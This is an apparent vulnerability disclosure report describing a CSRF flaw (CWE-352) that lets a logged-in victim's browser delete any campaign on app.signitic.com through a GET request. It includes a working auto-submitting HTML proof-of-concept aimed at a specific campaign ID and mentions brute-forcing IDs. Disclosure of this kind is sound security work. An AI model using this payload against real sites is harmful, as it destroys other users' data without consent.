**CSRF Vulnerability Allows Deletion of Other Users’ Campaigns via GET Request**
**Cross-Site Request Forgery (CSRF) – CWE-352**

Url : `https://app.signitic.com/campaign/<campaign_id>/delete`

## Description
The endpoint responsible for deleting campaigns is vulnerable to Cross-Site Request Forgery (CSRF). It accepts unauthenticated GET requests without validating the origin or requiring a CSRF token. As a result, an attacker can craft a malicious webpage that silently issues a delete request for a campaign while the victim is logged in, leading to unauthorized deletion of campaign resources — including those not owned by the victim.

## Steps to Reproduce

1. Log in to `https://app.signitic.com` with a valid user account.
2. While logged in, open the following CSRF Proof-of-Concept page crafted by the attacker:
3. <html>
     <body>
    <form action="https://app.signitic.com/campaign/140008/delete" method="GET">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
    </body>
     </html>
     
4. Once the page is loaded, the form is auto-submitted using the victim’s active session.
5. Campaign with ID `140008` (not necessarily owned by the victim) is deleted without user consent or interaction.

## Impact

- Any authenticated user can be tricked into deleting **any campaign**.
- No ownership check is enforced — users can delete campaigns they don’t own.
- High potential for data loss and abuse if campaign IDs are brute-forced.